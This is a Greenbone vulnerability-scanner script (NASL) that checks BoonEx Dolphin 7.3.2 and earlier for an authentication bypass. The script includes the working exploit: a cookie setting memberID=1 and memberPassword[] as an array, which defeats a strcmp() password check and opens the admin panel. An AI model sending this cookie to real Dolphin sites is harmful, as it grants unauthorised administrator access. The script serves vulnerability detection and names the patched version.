CPE = "cpe:/a:boonex:dolphin";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106361" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-11-01 10:57:40 +0700 (Tue, 01 Nov 2016)" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_name( "Dolphin Authentication Bypass Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dolphin_detect.sc" );
	script_mandatory_keys( "Dolphin/Installed" );
	script_xref( name: "URL", value: "https://security-geeks.blogspot.com/2016/10/boonex-dolphin-all-versoin-73.html" );
	script_tag( name: "summary", value: "Dolphin is prone to an authentication bypass vulnerability." );
	script_tag( name: "vuldetect", value: "Tries to bypass the authentication and access the admin panel." );
	script_tag( name: "insight", value: "Dolphin uses strcmp() to check the password in admin.inc.php. If an
  array is provided instead of a string in the cookie value 'memberPassword, authentication can be bypassed." );
	script_tag( name: "impact", value: "An attacker may bypass the authentication and access e.g. the admin panel." );
	script_tag( name: "affected", value: "BoonEx Dolphin 7.3.2 and prior." );
	script_tag( name: "solution", value: "Update to 7.3.3 or later." );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
vtstrings = get_vt_strings();
url = dir + "/administration/profiles.php";
cookie = "memberID=1; memberPassword[]=" + vtstrings["lowercase"];
if(http_vuln_check( port: port, url: url, pattern: "Admin Menu", extra_check: "title=\"Logout\"", check_header: TRUE, cookie: cookie )){
	report = "It was possible to bypass the authentication and access the admin panel under: " + http_report_vuln_url( port: port, url: url, url_only: TRUE );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

